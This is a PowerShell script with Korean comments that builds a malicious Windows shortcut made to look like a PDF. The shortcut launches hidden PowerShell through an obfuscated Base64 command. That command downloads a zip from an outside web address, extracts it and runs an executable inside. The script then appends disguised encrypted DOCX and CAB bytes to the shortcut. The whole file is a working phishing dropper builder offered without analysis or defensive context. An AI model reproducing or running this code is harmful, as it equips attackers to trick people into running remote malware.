# 스크립트가 있는 디렉토리 가져오기
$scriptDir = Split-Path -Path $MyInvocation.MyCommand.Definition -Parent

# LNK 파일 경로 정의
$lnkPath = Join-Path -Path $scriptDir -ChildPath "MaliciousLink.lnk"

# 대상 실행 파일 경로 정의
$targetPath = "C:\Windows\System32\cmd.exe"

# 명령 인자 정의 (난독화된 PowerShell 스크립트)
$arguments = "/c powershell -WindowStyle Hidden -EncodedCommand JABkAG8AYwB4AEYAaQBsAGUAIAA9ACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAGQAdQBtAG0AeQAuAGQAbwBjAHgAIgA7ACAAJABjAGEAYgBGAGkAbABlACAAPQAgACIAJABlAG4AdgA6AFAAdQBiAGwAaQBjAFwAVQBIAEMARgBiAEcALgBjAGEAYgAiADsAIAAkAHUAcgBsACAAPQAgACIAaAB0AHQAcABzADoALwAvAGcAbwBvAHMAZQBzAHMALgBjAG8AbQAvAHIAZQBhAGQALwBnAGUAdAAuAHAAaABwACIAOwAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAHUAcgBsACAALQBPAHUAdABGAGkAbABlACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAGcAaQB0AGgAdQBiAC4AegBpAHAAIgA7ACAARQB4AHAAYQBuAGQALQBBAHIAYwBoAGkAdgBlACAALQBQAGEAdABoACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAGcAaQB0AGgAdQBiAC4AegBpAHAAIgAgAC0ARABlAHMAdABpAG4AYQB0AGkAbwBuAFAAYQB0AGgAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAcABhAHkAbABvAGEAZAAiACAALQBGAG8AcgBjAGUAOwAgAFIAZQBtAG8AdgBlAC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACIAJABlAG4AdgA6AFQARQBNAFIAXABQAGEAVQBMAE8AQQBEACIAIAAtAEYAbwByAGMAZQA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAHAAYQB5AGwAbwBhAGQAXABnAGkAdABoAHUAYgAuAGUAeABlACIA"

# Define the path for the custom PDF icon
$pdfIconPath = Join-Path -Path $PWD -ChildPath "pdf.ico"

# LNK 파일을 만들기 위한 COM 객체 생성
$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut($lnkPath)

# 바로가기 속성 설정
$shortcut.TargetPath = $targetPath
$shortcut.Arguments = $arguments
$shortcut.WorkingDirectory = [System.IO.Path]::GetDirectoryName($targetPath)
$shortcut.IconLocation = $pdfIconPath

# 바로가기 저장
$shortcut.Save()

Write-Host "악성 바로가기가 생성되었습니다: $lnkPath"

# 암호화된 데이터 (DOCX 및 CAB 파일) 추가
$encryptedDocx = [byte[]]@(0x01, 0x1A, 0x52, 0x55, 0x45, 0x51, 0x59, 0x59, 0x59, 0x51, 0x17, 0x5A, 0x0B, 0x09, 0x51, 0x51)
$encryptedCab = [byte[]]@(0xC9, 0x0B, 0xCB, 0xCE, 0x8B, 0x8B, 0x8B, 0x8B, 0x47, 0xB4, 0x89, 0x8B, 0x8B, 0x3B, 0x8B, 0x8B)

# LNK 파일에 암호화된 데이터 추가
$stream = [System.IO.File]::OpenWrite($lnkPath)
$stream.Seek(0, [System.IO.SeekOrigin]::End)
$stream.Write($encryptedDocx, 0, $encryptedDocx.Length)
$stream.Write($encryptedCab, 0, $encryptedCab.Length)
$stream.Close()

Write-Host "암호화된 데이터가 LNK 파일에 추가되었습니다."